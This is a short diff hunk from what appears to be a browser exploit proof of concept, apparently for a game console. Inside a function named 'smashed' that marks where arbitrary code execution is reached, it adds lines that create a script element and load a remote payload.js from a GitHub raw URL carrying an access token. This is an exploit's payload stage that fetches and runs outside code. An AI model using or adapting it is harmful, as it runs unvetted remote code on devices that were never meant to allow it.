@@ -100,6 +100,9 @@ function allocbufptrs() {
 
 function smashed(stl) {
 	alert("Arbitrary code execution here.")
+	var x = document.createElement('script');		
+	x.src = 'https://raw.githubusercontent.com/slimsag/switchpoc/master/payload.js?token=AIMi8uOhXiZKZj_G3GIby3vXtv0ultOiks5Yz0qNwA%3D%3D&cb=' + math.random();		
+	document.getElementsByTagName("head")[0].appendChild(x);
 	return 0;
 }
 
